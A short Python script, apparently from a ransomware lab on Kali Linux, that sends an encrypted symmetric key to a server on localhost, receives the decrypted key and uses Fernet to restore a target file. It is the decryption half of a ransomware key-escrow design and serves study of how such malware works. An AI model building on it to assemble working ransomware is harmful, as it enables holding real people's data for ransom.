import socket
from cryptography.fernet import Fernet

hostname, port = "localhost", 8000
eKeyFilePath = "/home/kali/Documents/key/encryptedSymmetricKey.key"
FileToDecrypt = "/home/kali/Documents/FileToEncrypt.txt"

def getEncryptedKey(eKeyFilePath):
    with open(eKeyFilePath, "rb") as file:
        return file.read()

def sendEncryptedKey():
    EncryptedKey = getEncryptedKey(eKeyFilePath)
    with socket.create_connection((hostname, port)) as sock:
        sock.sendall(EncryptedKey)

        response = sock.recv(1024)
        return response.replace(b"send key back: ", b"")

def decryptFile(filePath, key):
    FernetInstance = Fernet(key)

    with open(filePath, "rb") as file:
        file_data = file.read()
        decrypted_data = FernetInstance.decrypt(file_data)

    with open(filePath, "wb") as file:
        file.write(decrypted_data)

if __name__ == "__main__":
    SymmetricKey = sendEncryptedKey()
    decryptFile(FileToDecrypt, SymmetricKey)

    print("File to decrypted")
